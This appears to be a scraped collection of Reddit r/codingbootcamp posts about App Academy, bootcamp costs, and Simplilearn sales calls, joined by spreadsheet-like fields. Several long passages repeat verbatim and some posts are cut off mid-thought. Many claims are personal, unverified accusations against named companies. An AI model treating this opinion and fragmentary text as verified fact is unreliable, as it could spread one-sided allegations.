Reviews online?: I've seen mostly positive reviews on Course Report, SwitchUp, CareerKarma, and LinkedIn with mixed reviews on Reddit, YouTube, Yelp, and Google Maps. [There's going to be bias on both sides from online sources](https://www.reddit.com/r/codingbootcamp/comments/xy7kdz/comment/irg3jmc/?utm_source=share&amp;utm_medium=web2x&amp;context=3).

CIRR?: [going to relink this one](https://www.reddit.com/r/codingbootcamp/comments/xy7kdz/comment/irg3jmc/?utm_source=share&amp;utm_medium=web2x&amp;context=3) because explained it well, CIRR may have bias, but tries to be transparent and ya App Academy doesn't do it but neither do other large bootcamps like General Assembly.

Software engineer job after?: Yes and [others have noted](https://www.reddit.com/r/codingbootcamp/comments/xy17pm/comment/irfr2r4/?utm_source=share&amp;utm_medium=web2x&amp;context=3) alumni do get some sort of tech job after graduation and had a positive experience. Ya their partnership jobs aren't only software engineer jobs, and ya I know some who've returned to old jobs after or have been laid off as others have said. Probably not unique to a/A or coding bootcamps. And people can get engineering jobs after.

Curriculum quality?: pretty subpar and didn't match standards you may have for the price of tuition or college quality imo. I'm [not the only one to say](https://www.reddit.com/r/codingbootcamp/comments/nmyp17/currently_avoid_app_academy/) [this on sites](https://www.reddit.com/r/codingbootcamp/comments/xytjx0/comment/irlcojf/?utm_source=share&amp;utm_medium=web2x&amp;context=3) that have mixed reviews like Reddit, Yelp, YouTube, Google Maps, etc but [others have noted](https://www.reddit.com/r/cscareerquestions/comments/8slqh6/comment/e270dgi/?utm_source=share&amp;utm_medium=web2x&amp;context=3) that for them they were satisfied on those very same websites and ones with positive reviews like Course Report, SwitchUp, etc. Ya a curriculum person was fired in the past for the online program but its probably not unique to a/A as a coding bootcamp. There were typos but there's probably typos in online curriculum other places. There was a module or two that were iffy with stuff that sometimes didn't work but others weren't bad.

High deferral rates? Assessment difficulty level?: ya they can be tricky to pass. They provide study guides and on some weeks they seemed to prepare one better than other weeks imo. They've [been noted](https://www.reddit.com/r/codingbootcamp/comments/xjfg6c/comment/ipb4tzi/?utm_source=share&amp;utm_medium=web2x&amp;context=3) to have [high deferral rates](https://www.reddit.com/r/codingbootcamp/comments/xy17pm/comment/irgzzpf/?utm_source=share&amp;utm_medium=web2x&amp;context=3) [multiple](https://www.reddit.com/r/codingbootcamp/comments/u24f3e/comment/i4hq473/?utm_source=share&amp;utm_medium=web2x&amp;context=3) [times](https://www.reddit.com/r/codingbootcamp/comments/u24f3e/comment/i4hrw4y/?utm_source=share&amp;utm_medium=web2x&amp;context=3) but [some are](https://www.reddit.com/r/codingbootcamp/comments/ti3981/past_experiences_with_app_academy_needed/) [down for it](https://www.reddit.com/r/codingbootcamp/comments/xytjx0/comment/irjwqk4/?utm_source=share&amp;utm_medium=web2x&amp;context=3). To each their own.

Cheating issue?: [maybe most online school programs](https://www.reddit.com/r/codingbootcamp/comments/xytjx0/comment/irjyngb/?utm_source=share&amp;utm_medium=web2x&amp;context=3) not just coding bootcamps have this issue, but ya App Academy did from my experience and [recent posts](https://www.reddit.com/r/codingbootcamp/comments/xytjx0/comment/irq7412/?utm_source=share&amp;utm_medium=web2x&amp;context=3) [have mentioned](https://www.reddit.com/r/codingbootcamp/comments/xytjx0/verifying_the_accusations_levied_against_app) this. Seen it mentioned on other websites. Ya they could do a better job of switching assessment versions between cohorts to help prevent this from people who're on both sides. But I've heard its not as bad for in person programs.

Staff?: there was a mix of both alumni and non-alumni with diff levels of experience or education, but ya all TAs were alumni and most cohort leads or mod leads were alumni tho were a few non-alumni. Mix of alumni and non-alumni for roles like career staff. Probably not unique to a/A.

Post-program a/A: my career coach wasn't an alumni but some classmates friends had alumni career coaches. Its mixed. Mine was nice and respectful but one of my friends wasnt and left a/A shortly after. Its been noted online theres high turnover with their staff yet isn't unique to a/A as a bootcamp. They do make you apply to a certain amount of jobs per week otherwise you'll get a strike like while in the program. But they reset your strikes if you have any once you reach graduation. They do review your resume though it wasn't much different from tips you can find online or college career centers but if you're new to resume writing its helpful.

Would I recommend them?:  no. Some of my classmate friends would and some wouldn't. Probably not unique to a/A its like this for any coding bootcamp. Looks like [I'm not alone](https://www.reddit.com/r/codingbootcamp/comments/xytjx0/comment/irlcojf/?utm_source=share&amp;utm_medium=web2x&amp;context=3) since a former TA staff said the same.

Admissions staff sales-y?: sure but probably not unique to a/A. I saw the Glassdoor link on how there's a noted bonus or commissions aspect to their role. I saw their admissions staff on LinkedIn with the sales descriptions, awards, previous sales jobs before a/A, sure. But don't know how 100% Glassdoor or LinkedIn. 

Biased alumni? Linkedin, Reddit, etc sites chat?: sure but probably not unique to a/A. I've seen the points that there's survivorship bias or not, that ones who post on LinkedIn for them are gonna be positive since you're prob not posting something negative. Had an interviewer who was an alumni even and explained he took them off of his resume and LinkedIn after a few years of work experience. Maybe if one had a bad experience they wouldn't note them either. And ya you pay a lot of tuition $, I can see how a negative on them can be like a negative on your skills for getting jobs. But reaching out to alumni even if some sort of bias or mostly positive is still going to be helpful anyways.

Customer complaints? Bureau for Private Postsecondary Education? Better Business Bureau?: ya but probably not unique to a/A. Tho I'd never heard of these two so that was new to see. [Here](https://www.bppe.ca.gov/enforcement/actions/citation_1415032_mod.pdf) [here](https://www.bppe.ca.gov/enforcement/actions/citation_1516032.pdf) [here](https://www.bppe.ca.gov/enforcement/actions/appacademy_ord.pdf) n [here](https://www.bbb.org/us/ca/san-francisco/profile/specialty-schools/app-academy-llc-1116-889911), tried to read the 1 complaint listed on last link but rn it's a 404 page so idk.

Lawsuits?: ya they've had several recent lawsuits in the past years. That was new didn't know that before. But there were small payouts as [others noted](https://www.reddit.com/r/codingbootcamp/comments/xytjx0/verifying_the_accusations_levied_against_app/). Maybe not unique to a/A or for-profit education companies/schools. 

Parent company?: ya their parent company is Hash Map Labs Inc. But other companies do this even some big tech ones.

TalentMatch?: new to me saw that [in one of the recent posts](https://www.reddit.com/r/codingbootcamp/comments/xytjx0/verifying_the_accusations_levied_against_app/). Wasn't mentioned during admissions process or as an alumni or student but idk it could've been in the contract and maybe others know about it. Could also not be unique to a/A and maybe other coding bootcamps have this.

Best of luck everyone",App Academy Bootcamp Experience,"Pros and cons based on a subpar experience below. Saw a recent one that outlined mostly cons, and one after linking that post with mostly pros.

I'm [not the only one to say](https://www.reddit.com/r/codingbootcamp/comments/nmyp17/currently_avoid_app_academy/) [this on sites](https://www.reddit.com/r/codingbootcamp/comments/xytjx0/comment/irlcojf/?utm_source=share&amp;utm_medium=web2x&amp;context=3) that have mixed reviews like Reddit, Yelp, YouTube, Google Maps, etc but [others have noted](https://www.reddit.com/r/cscareerquestions/comments/8slqh6/comment/e270dgi/?utm_source=share&amp;utm_medium=web2x&amp;context=3) that for them they were satisfied on those very same websites and ones with positive reviews like Course Report, SwitchUp, etc. Ya a curriculum person was fired in the past for the online program but its probably not unique to a/A as a coding bootcamp. There were typos but there's probably typos in online curriculum other places. There was a module or two that were iffy with stuff that sometimes didn't work but others weren't bad.

High deferral rates? Assessment difficulty level?: ya they can be tricky to pass. They provide study guides and on some weeks they seemed to prepare one better than other weeks imo. They've [been noted](https://www.reddit.com/r/codingbootcamp/comments/xjfg6c/comment/ipb4tzi/?utm_source=share&amp;utm_medium=web2x&amp;context=3) to have [high deferral rates](https://www.reddit.com/r/codingbootcamp/comments/xy17pm/comment/irgzzpf/?utm_source=share&amp;utm_medium=web2x&amp;context=3) [multiple](https://www.reddit.com/r/codingbootcamp/comments/u24f3e/comment/i4hq473/?utm_source=share&amp;utm_medium=web2x&amp;context=3) [times](https://www.reddit.com/r/codingbootcamp/comments/u24f3e/comment/i4hrw4y/?utm_source=share&amp;utm_medium=web2x&amp;context=3) but [some are](https://www.reddit.com/r/codingbootcamp/comments/ti3981/past_experiences_with_app_academy_needed/) [down for it](https://www.reddit.com/r/codingbootcamp/comments/xytjx0/comment/irjwqk4/?utm_source=share&amp;utm_medium=web2x&amp;context=3). To each their own.

Cheating issue?: [maybe most online school programs](https://www.reddit.com/r/codingbootcamp/comments/xytjx0/comment/irjyngb/?utm_source=share&amp;utm_medium=web2x&amp;context=3) not just coding bootcamps have this issue, but ya App Academy did from my experience and [recent posts](https://www.reddit.com/r/codingbootcamp/comments/xytjx0/comment/irq7412/?utm_source=share&amp;utm_medium=web2x&amp;context=3) [have mentioned](https://www.reddit.com/r/codingbootcamp/comments/xytjx0/verifying_the_accusations_levied_against_app) this. Seen it mentioned on other websites. Ya they could do a better job of switching assessment versions between cohorts to help prevent this from people who're on both sides. But I've heard its not as bad for in person programs.

Staff?: there was a mix of both alumni and non-alumni with diff levels of experience or education, but ya all TAs were alumni and most cohort leads or mod leads were alumni tho were a few non-alumni. Mix of alumni and non-alumni for roles like career staff. Probably not unique to a/A.

Post-program a/A: my career coach wasn't an alumni but some classmates friends had alumni career coaches. Its mixed. Mine was nice and respectful but one of my friends wasnt and left a/A shortly after. Its been noted online theres high turnover with their staff yet isn't unique to a/A as a bootcamp. They do make you apply to a certain amount of jobs per week otherwise you'll get a strike like while in the program. But they reset your strikes if you have any once you reach graduation. They do review your resume though it wasn't much different from tips you can find online or college career centers but if you're new to resume writing its helpful.

Would I recommend them?:  no. Some of my classmate friends would and some wouldn't. Probably not unique to a/A its like this for any coding bootcamp. Looks like [I'm not alone](https://www.reddit.com/r/codingbootcamp/comments/xytjx0/comment/irlcojf/?utm_source=share&amp;utm_medium=web2x&amp;context=3) since a former TA staff said the same.

Admissions staff sales-y?: sure but probably not unique to a/A. I saw the Glassdoor link on how there's a noted bonus or commissions aspect to their role. I saw their admissions staff on LinkedIn with the sales descriptions, awards, previous sales jobs before a/A, sure. But don't know how 100% Glassdoor or LinkedIn. 

Biased alumni? Linkedin, Reddit, etc sites chat?: sure but probably not unique to a/A. I've seen the points that there's survivorship bias or not, that ones who post on LinkedIn for them are gonna be positive since you're prob not posting something negative. Had an interviewer who was an alumni even and explained he took them off of his resume and LinkedIn after a few years of work experience. Maybe if one had a bad experience they wouldn't note them either. And ya you pay a lot of tuition $, I can see how a negative on them can be like a negative on your skills for getting jobs. But reaching out to alumni even if some sort of bias or mostly positive is still going to be helpful anyways.

Customer complaints? Bureau for Private Postsecondary Education? Better Business Bureau?: ya but probably not unique to a/A. Tho I'd never heard of these two so that was new to see. [Here](https://www.bppe.ca.gov/enforcement/actions/citation_1415032_mod.pdf) [here](https://www.bppe.ca.gov/enforcement/actions/citation_1516032.pdf) [here](https://www.bppe.ca.gov/enforcement/actions/appacademy_ord.pdf) n [here](https://www.bbb.org/us/ca/san-francisco/profile/specialty-schools/app-academy-llc-1116-889911), tried to read the 1 complaint listed on last link but rn it's a 404 page so idk.

Lawsuits?: ya they've had several recent lawsuits in the past years. That was new didn't know that before. But there were small payouts as [others noted](https://www.reddit.com/r/codingbootcamp/comments/xytjx0/verifying_the_accusations_levied_against_app/). Maybe not unique to a/A or for-profit education companies/schools. 

Parent company?: ya their parent company is Hash Map Labs Inc. But other companies do this even some big tech ones.

TalentMatch?: new to me saw that [in one of the recent posts](https://www.reddit.com/r/codingbootcamp/comments/xytjx0/verifying_the_accusations_levied_against_app/). Wasn't mentioned during admissions process or as an alumni or student but idk it could've been in the contract and maybe others know about it. Could also not be unique to a/A and maybe other coding bootcamps have this.

codingbootcamp,"Hello, I live in Colorado and have wanted to make a career change for the past few years. Software engineering has appealed to me as a good alternative to what I’m doing and I know that it’s an intense undertaking. I’ve self-taught off and on and realize that if I want to make the breakthrough and actually get a job in tech, I need to be consistent and produce projects. I’m still debating continuing the self-taught route and just refusing to step away when I encounter an obstacle, which is what has been holding me back, or immersing myself in the fire of a boot camp, which doesn’t give me the option to step away and provides a valuable network. 

I’ve narrowed it down to 2 boot camps: Turing and Skill Distillery, both of which have good reviews. Turing is 7 months long and will increase their tuition to $25K in January, which will make them the most expensive boot camp I’ve seen and Skill Distillery is $20K for 4 months. The thing that has been nagging me over the tuitions, though, is cost of living while in these programs. Beyond the program I have to consider months of job hunting full-time. What’s the best way to approach this? One of Turing’s finance partners offers an $18K cost of living loan and Skill Distillery has an ISA option, but I don’t see a cost of living loan option, although I’m sure I can find one. Also, although I like the idea of being in a longer program with Turing, that means I have to be unemployed that much longer, which means potentially close to a year without an income. Even with 18K to help, that would be pushing it even with my savings, which I’d rather not take to the brink of nothing. 

I’m ready to make this career change, but I need to figure out the best way to support myself financially while attending a boot camp. Has anyone moved back home with family to do this? That would involve me going to Georgia, where there’s a 2 hour time difference and I’d rather go to a boot camp in the state I plan on looking for work.

Alternatively, I could just get more disciplined with self-teaching. I’m currently on my first big project on The Odin Project (Landing Page) and have enjoyed the curriculum so far. Honestly, this path would be ideal because I could keep working while I do it. I just need to get better at approaching projects and troubleshooting. I know I can figure it out!

How did you approach living without a job while attending a boot camp? Did you just save up enough for the duration of the boot camp and a few months after? Take out a loan? Move in with someone? What are your opinions on the 2 boot camps I listed? Another question I have is do you feel that the move to a remote teaching model has made boot camps less valuable? I’m hesitant to pay $25K for a remote program, even though the feedback is good.

codingbootcamp,"I don't know of any bootcamp that teaches foundational CS topics. All of them teach you a bunch of frameworks for web dev, but you get students who honestly don't have a clue about what the computer is really doing.

codingbootcamp,"Here's what I would've wanted to know before choosing a bootcamp, as I recently completed a/A's 24-week curriculum and regret it (long read ahead:

* **Curriculum quality and experience** let's get into the reality: most alumni are incentivized to say great things because they've paid \~$20,000 to $31,000 and undermining them undermines their skills. Despite me being an alumnus, I'm going to state my experience and what I'd recommend for others to look into when considering bootcamps. In my opinion, the curriculum quality and experience was worth half the cost and you pay to teach yourself essentially. That's my take.
* **How sales-like their staff really are** prior to you paying or signing a contract to enroll, such as their admissions staff. For example, App Academy's admissions staff earn bonuses or commission past base pay. I verified this during the application process by asking an admissions staff who even once called me on a Saturday during the process. But he assured me that they ""weren't doing anything wrong"" despite earning some sort of commission/bonus in addition to base pay as admissions staff, I think related to the amount of people they get to sign an a/A contract but idk. [Glassdoor](https://www.glassdoor.com/Salary/App-Academy-Admissions-Specialist-Salaries-E759554_D_KO12,33.htm) seems to reflect this too for those roles at App Academy so do some looking around on Glassdoor for admissions-like staff at whichever bootcamp you're considering too.
* **Whether they rush you through the application process**. For example, with App Academy I was interested in applying for a date that was \~1.5 months out. When they responded to me, they let me know a sooner date to join was actually available at the end of that month in \~2-3 weeks but had an orientation Zoom meeting a bit earlier. I ended up having the take home ""project"" of html/css, IQ-like test, video interview, etc. and contract emailed to sign all in a span of like 1.5 weeks in order to make an orientation Zoom meeting for this earlier cohort. I kept stressing it was fine if I didn't finish the process in time by this magically sooner start date, and personally felt rushed to finish anyways by it instead of the later one. This meant I had no time to seriously look into or apply to other bootcamps and I wonder if it's a strategy used. And I was sleep deprived by the time a very long contract was sent to me to read through, which also didn't have text searchable -- mine was more like image files where I couldn't *control + f* for certain words.
* **Yelp reviews/public review websites**. Know that companies can maybe\* can influence\* Yelp (I assume) to hide 1-star reviews or reviews containing certain contents. I tried leaving a 1-star Yelp review 3 different times so far for a/A and each time Yelp has made it not public within a few days. From this experience I think that it's fair to be skeptical of other purely review-based websites, especially ones dedicated to bootcamps.
* **Whether they've ever participated in** [**CIRR**](https://cirr.org/). For example, App Academy never has.
* **Whether they're regulated by the Bureau for Private Postsecondary Education and the reasons why they were**, how many times they've been fined and for what reasons, and how they went about resisting being regulated by them initially if they did. For example, A/A resisted and was fined some more after officially regulated by them, yet ironically includes it like a badge that they're a school and regulated by BPPE now. Interesting note: a/A was caught not verifying students/customers high school transcripts/diplomas or college degrees and they also didn't disclose job rates for alumni or any data like that.[https://www.bppe.ca.gov/enforcement/actions/citation\_1516032.pdf](https://www.bppe.ca.gov/enforcement/actions/citation_1516032.pdf)[https://www.bppe.ca.gov/enforcement/actions/citation\_appacademy.pdf](https://www.bppe.ca.gov/enforcement/actions/citation_appacademy.pdf)[https://www.bppe.ca.gov/enforcement/actions/appacademy\_ord.pdf](https://www.bppe.ca.gov/enforcement/actions/appacademy_ord.pdf)
* **Whether they've been reported to the Better Business Bureau**. App Academy has had complaints reported to them 2x at least in recent years (but they've already removed one from being publicly visible online in the past few months)
* **Lawsuits**. How many, what were the reasons (if you can find out why online), how recent they were. For example, App Academy has had four lawsuits between recent students/customers and them at least with filing dates in 2018, 2019, and 2020. Their parent company is Hash Map Labs Inc so you wouldn't see it unless you looked up their parent company.
* **Whether the bootcamp has a parent company**. App Academy's is Hash Map Labs Inc. I think this is important since some information during research may not be easily discoverable unless you look into the parent company that the bootcamp belongs to.
* **YouTube videos**. Look at recent ones and their comments, decide for yourself. Though keep in mind some may incentivize alumni who happen to be influencers or YouTubers in some way to make a review on them, or that's what some speculate anyways.
* **Gender ratio** of student body and staff. For example, App Academy's student body was about \~85-90% male and \~15-10% female and is the case on average for them. Noting in case user cares about this type of experience.
* **Class size**. For example, App Academy's online one started with 100-120 people in mine and reduced down to \~45 by midway through, which somehow is about average for their online cohorts and maybe in person too (each cohort seems to have on avrg about 30-40s despite larger initial start number).
* **Who their staff are**, such as educational ones (instructors and TAs). Alumni of the program mostly? App Academy's was for most of their educational staff in my experience, even for some of their non-educational staff roles like career coaches. Sure, some of their educational staff may have been former teachers themselves, but they still have 0 experience as a SWE/SDE despite maybe being a former English or whichever subject teaching background prior to being an alumnus of the program and becoming an instructor.
* **Bonus**: if you've recently finished a bootcamp, know people who are in one, or etc. I suggest doing a test of applying to jobs for a few weeks without the bootcamp on your resume and compare with a few weeks of when it is on yours. When I graduated from a/A, I did this test the first few weeks where I didn't put a/A on my resume. Instead, I kept that education section portion vague and said I completed a certificate program in SWE/SDE (since technically a/A issues a certificate of completion). I got the same number of interviews, phone screens, and take homes as I did when I later put a/A on my resume. But note that I had a college degree in a semi-decent subject from a decent school (with a good gpa, scholarship, award, some science/math courses to list), about a year of good work experience as well as work experience while in college, and 3 ""impressive"" portfolio projects that a/A didn't really help me make.

Also wanted to add in that I had my post focus on things that didn't seem as accessible or shared before here on Reddit since it seems like you can find people weigh in with their experience already in multiple posts or comments. This post is already super long. If people really want, I can append a few more paragraphs on my experience specifically, I'm not against that or avoiding doing so.

This meant I had no time to seriously look into or apply to other bootcamps and I wonder if it's a strategy used. And I was sleep deprived by the time a very long contract was sent to me to read through, which also didn't have text searchable -- mine was more like image files where I couldn't *control + f* for certain words.
* **Yelp reviews/public review websites**. Know that companies can maybe\* can influence\* Yelp (I assume) to hide 1-star reviews or reviews containing certain contents. I tried leaving a 1-star Yelp review 3 different times so far for a/A and each time Yelp has made it not public within a few days. From this experience I think that it's fair to be skeptical of other purely review-based websites, especially ones dedicated to bootcamps.
* **Whether they've ever participated in** [**CIRR**](https://cirr.org/). For example, App Academy never has.
* **Whether they're regulated by the Bureau for Private Postsecondary Education**, how many times they've been fined and for what reasons, and how they went about resisting being regulated by them initially if they did. For example, A/A resisted and was fined some more after officially regulated by them, yet ironically includes it like a badge that they're a school and regulated by BPPE now. Interesting note: a/A was caught not verifying students/customers high school transcripts/diplomas or college degrees and they also didn't disclose job rates for alumni or any data like that.

[https://www.bppe.ca.gov/enforcement/actions/appacademy\_ord.pdf](https://www.bppe.ca.gov/enforcement/actions/appacademy_ord.pdf)
* **Whether they've been reported to the Better Business Bureau**. App Academy has had complaints reported to them 2x at least in recent years (but they've already removed one from being publicly visible online in the past few months)
* **Lawsuits**. How many, what were the reasons (if you can find out why online), how recent they were. For example, App Academy has had four lawsuits between recent students/customers and them at least with filing dates in 2018, 2019, and 2020. Their parent company is Hash Map Labs Inc so you wouldn't see it unless you looked up their parent company.
* **Whether the bootcamp has a parent company**. App Academy's is Hash Map Labs Inc. I think this is important since some information during research may not be easily discoverable unless you look into the parent company that the bootcamp belongs to.
* **YouTube videos**. Look at recent ones and their comments, decide for yourself. Though keep in mind some may incentivize alumni who happen to be influencers or YouTubers in some way to make a review on them, or that's what some speculate anyways.
* **Gender ratio** of student body and staff. For example, App Academy's student body was about \~85-90% male and \~15-10% female and is the case on average for them. Noting in case user cares about this type of experience.
* **Class size**. For example, App Academy's online one started with 100-120 people in mine and reduced down to \~45 by midway through, which somehow is about average for their online cohorts and maybe in person too (each cohort seems to have on avrg about 30-40s despite larger initial start number).
* **Who their staff are**, such as educational ones (instructors and TAs). Alumni of the program mostly? App Academy's was for most of their educational staff in my experience, even for some of their non-educational staff roles like career coaches. Sure, some of their educational staff may have been former teachers themselves, but they still have 0 experience as a SWE/SDE despite maybe being a former English or whichever subject teaching background prior to being an alumnus of the program and becoming an instructor.
* **Bonus**: if you've recently finished a bootcamp, know people who are in one, or etc. I suggest doing a test of applying to jobs for a few weeks without the bootcamp on your resume and compare with a few weeks of when it is on yours. When I graduated from a/A, I did this test the first few weeks where I didn't put a/A on my resume. Instead, I kept that education section portion vague and said I completed a certificate program in SWE/SDE (since technically a/A issues a certificate of completion). I got the same number of interviews, phone screens, and take homes as I did when I later put a/A on my resume. But note that I had a college degree in a semi-decent subject from a decent school (with a good gpa, scholarship, award, some science/math courses to list), about a year of good work experience as well as work experience while in college, and 3 ""impressive"" portfolio projects that a/A didn't really help me make.

Also wanted to add in that I had my post focus on things that didn't seem as accessible or shared before here on Reddit since it seems like you can find people weigh in with their experience already in multiple posts or comments. This post is already super long. If people really want, I can append a few more paragraphs on my experience specifically, I'm not against that or avoiding doing so.

It's easy to look at [this post](https://www.reddit.com/r/codingbootcamp/comments/xy17pm/recent_app_academy_grad_heres_what_i_wish_i_knew/) and see a long list of red flags. But it's not uncommon for someone to have an agenda beyond what's being presented.

The entire post presents exactly *ONE* valid and substantiated concern regarding App Academy: they are not part of the [CIRR](https://cirr.org/), a small nonprofit that regulates advertising and stat reporting for a number of coding bootcamps. This  is a legitimate piece of info to be aware of when it comes to considering App Academy as your choice of bootcamp.

Meanwhile, let's talk about the other proof provided. One link to Glassdoor shows that App Academy's recruiters get paid commission for signing up a new customer. I'll just leave that alone because hopefully the common sense of that fact speaks for itself and doesn't need a link to Glassdoor in the first place.

After that there are three links showing that App Academy was fined $50k once for violating an Approval to Operate in 2015 (which they have clearly since rectified), and that they were fined $7k once for not verifying an insignificant number of applicants' high school diplomas and not formatting their paperwork correctly. Hardly a smoking gun.

Then there is a series of unsubstantiated claims like App Academy is removing reviews, removing reports to the BBB, and only hiring alumni. Nothing to back any of that up, just someone saying words on the internet. After that, the four lawsuits filed against them are brought up but the details are left vague. I wonder why?

Let's look in to those lawsuits. One resulted in a [payout of $450](https://unicourt.com/case/ca-sfc-hash-map-labs-inc-dba-app-academy-a-delaware-vs-matthew-corley-526533), another was a [payout of $370](https://unicourt.com/case/ca-sfc-hash-map-labs-inc-dba-app-academy-vs-rayyan-ahmed-528093), the third is once again a [payout of $370](https://unicourt.com/case/ca-sfc-hash-map-labs-inc-dba-app-academy-a-delaware-vs-brian-kang-528088), and the fourth is a [workers' comp settlement](https://trellis.law/case/cgc19575170/samorn-selim-vs-hash-map-labs-inc-dba-app-academy-et-al). Nothing here to so much as raise an eyebrow at.

But why would someone go out of their way to slander a bootcamp they attended? Perhaps some insight can be gained from the comments of the post, where two of the OP's classmates felt compelled to [speak up](https://www.reddit.com/r/codingbootcamp/comments/xy17pm/recent_app_academy_grad_heres_what_i_wish_i_knew/irfvhm5/) calling out OP's cheating (which OP tacitly [admits to](https://www.reddit.com/r/codingbootcamp/comments/xy17pm/recent_app_academy_grad_heres_what_i_wish_i_knew/irg10x2/)) and the fact that OP was a personality conflict within the cohort.

codingbootcamp,"I am feeling a bit lost and was hoping for some advice/input on what my next step should be.

I started coding in July and have been working on JavaScript/html/ css modules on FreeCodeCamp and code academy. Most recently I have been doing Angela Yu's bootcamp on Udemy and also CSX (the Codesmith prep program). I am feeling like I am experiencing a total lack of focus(learning but in a very circular, inefficient manner). To complicate things, I also have started learning Python as well to prepare for a potential bootcamp interview. 

So here is my conundrum....I am not sure if the bootcamp route is right for me or if there is another way to become a developer. I have been staying home for the past 2.5 with my son, and I do not want to basically ""disappear"" for three months. I think I should be ready to go back to work by the time he goes to school/ daycare full-time (possibly a year from now or a bit longer). Luckily, I am not under the same time pressure as some other people wanting to break into tech, but it does feel like a Catch 22 in terms of gaining momentum/ motivation. But perhaps since I would be on an extended time frame, I could avoid paying a ton for a bootcamp . I have no qualms about paying for education and could probably scrounge up the eye-popping expense of most bootcamps but am pretty skeptical.

A little bit about me... My previous background is education, and I was most recently  in a ""teacher leadership"" position. I am in my early 40's and have a couple of masters degrees (one in education and another in a social science). The reason why I am not planning to return to education is that I feel like it is really a dead-end for me in terms of career progression and compensation. I love logic problems, being creative, and learning/ gaining expertise in something. My previous position was extremely educational technology heavy, and I am obviously passionate about that.

So far I have checked out all of the ""likely suspects"" in terms of the bootcamps, and I am still feeling a bit skeptical. Some, like some of the ones affiliated with some universities, have major scam vibes. Others that offer private loan or ISAs also sketch me out a bit. The ones that kick people out midway through are a ""no go"" from me. I used to be an adjunct professor at a for profit university, so I might be a little more aware/ paranoid about these practices than someone else. I also think I have a different perspective than I would in my '20s and would like a program where I can maintain some balance in my life(is this even realistic?).

Would I be better off paying for continuing education classes at a university? There is a JavaScript three course sequence at a university near me (for under 5k I think). Or choosing one online program(like TOP) and fully committing? What about the UPenn online MS in CS program (it is ""only"" 20k more than a bootcamp, but would you come out with better skills)?  Maybe Nucamp although there seem to be varied outcomes?

If you've made it this far, thank you for reading these ramblings. Anyone in a similar boat? Or completed a bootcamp with a toddler? Any suggestions are welcome.",Advice wanted,"I am feeling a bit lost and was hoping for some advice/input on what my next step should be.

codingbootcamp,"In a recent post about self-taught vs bootcamps, 100devs was mentioned as a free self-taught bootcamp option. 

This is the first time I had heard of 100devs so I did some research. People are extremely positive about it on other programming and JavaScript subreddits and it has a large discord server. 

This brings up the question of the value of paid boot camps vs 100devs since 100devs is a free online bootcamp and some of the participants are landing good jobs. 

What is the value of a paid bootcamp over 100devs? I imagine the graduation rate of a free bootcamp is extremely low but the cost is significantly more attractive and it can be done part-time. Paid bootcamps like Codesmith offer rigor, camaraderie, accountability, job support, and verified outcomes for ~90% of graduates.

How does one decide which route to take? The fact that the 100devs instructor is a GA bootcamp instructor put me on watch based on GA reviews and outcomes I read about here. 

I’m currently deciding whether or not I should do a bootcamp after spontaneously meeting a number of successful Codesmith grads. Is dedicating 3 months to a bootcamp and paying $20k worth it? If Codesmith cost more, would people still feel the same way?

codingbootcamp,"Hello! 

I am looking for advice in terms of the path I should go down to learn Web Dev. I was recently laid off from my last job about two weeks ago and I am looking to make a career change. I should receive about 6 months of unemployment so I think that should hold me over until I have to start digging into my savings.

I started working on Angela Yu's Complete 2022 Web Development Bootcamp to get a feel for development, and I am currently wrapping up the intermediate CSS portion of the course. So far I am enjoying it but ultimately I am using it to learn Web Dev material until I figure out which bootcamp I want to attend.

Alternatively, I found through CalJobs education services, they offer courses and certifications for Web Dev but they are slim pickings. I landed on a really interesting program through California State University San Marcos called ""Full Stack Web Developer with MEAN Stack (I'll link it below). What really caught my eye about it is that they offer what they call an ""Externship Opportunity"" which they will essentially hook me up with free work with one of their partnered employer's so I can do about 40 hours of unpaid on the job work after I complete the course work. To me this seems like it could be an excellent way to go my foot in the door with a company and also add work experience to my resume. I know certs dont mean much in this field but it does seem to be a fairly comprehensive course covering MEAN stack. Additional, I believe I would qualify for **Workforce Innovation and Opportunity Act Training (WIOA)** through CalJobs which would effectively pay for the program.

I am curious to know how you all would weigh the  40 hours of ""work experience"" and the education the course provides over one of these bigger bootcamps such as, GA, CodingDojo, Codesmith etc..

If anyone else has done something like this, can you let me know how your experience was so I may make a better informed decision?

codingbootcamp,"This is going to be a long read. Let me start from the beginning:

I graduated with a BS in comp sci a year ago. As my graduation was near, I figured it would be a good idea to expand my knowledge and skillset and learn blockchain development. I did some googling and came across Simplilearn's ""blockchain development BootCamp"" which apparently collaborated with CalTech. Obviously I seemed too good to be true but after some googling, I came across thousands of 5-star reviews and high Trustpilot ratings on this company, so I went ahead and send an email for possible enrollment.

This is where it gets interesting. The next day I received a call from one of their managers who was curious as to why I wanted to enroll. He then completely forgot about trying to actually market his company and he kept pushing me to pay now. Each time I would say I will consult with my parents first he kept saying ""Oh yeah of course but I'm sure if you tell your parents that this course is so important and will do nothing but good for my career so my parents have to be pleased. Also if you pay today the course will be discounted for you."" This was the number one red flag for me as it seemed like nothing but another one of those call center scams. I told him I will give him an answer soon. One day later I sent him an email saying I no longer wish to enroll in the program because I can clearly tell this is just a scam to pay for a useless course. 

Here is where the real problem began. Every day for the next 3-4 months ever since I informed him MULTIPLE times that I do not have interest in their scam, I would get at least 3-4 calls from the SAME woman at Simplilearn asking me why I don't want to be part of their program. I informed them at that point over 100 times that I am employed now and I do not care for the program and she would reply with ""okay I will remove you from the list."" Lo and behold the next day she calls again and again and again. At this point, I would pick up the phone and annoy her until she hangs up. I would block their numbers and they would still manage to call me from another number. 

After some time I stopped receiving any calls. It's been 6 months and today I got a call from an unfamiliar number. I immediately regretted answering the phone the second this moron spoke. He introduced himself as being from Simplilearn and that he came across my ""portfolio"" and that he wanted to see if I was interested in some ""scholarship"" program which was another bs course. I informed him that I am employed at a good company and do not wish to enroll in any course. He kept pushing to get information from me and get me to enroll in this course. I kept listening just so I can waste his time as I know this is all a bunch of lies to scam money. As this moron kept rumbling on, he mentioned that ""my employees have informed me of how impressed they are with your portfolio and that you are an outstanding programmer"". I stopped him from speaking at that point as their employees don't know a single thing about me and informed him that I do not want to be part of his damn course. Now, I'm sure everyone here has seen youtube videos of scam callers insulting the ""customer"" once they don't get what they want. This genius decides to respond to me by saying, ""I'm sorry that you are not smart enough and don't want to move up the ladder in life"". At that point, I couldn't stop myself from laughing. I never knew a full-stack developer is ""not smart enough"" for their scam course.

To sum it all up, AVOID THIS SCAM. Trust me, they will take your money and if they don't they will annoy the living shit out of you. The number is 415-430-9684 for anyone that has gotten pulled into their spam calls.

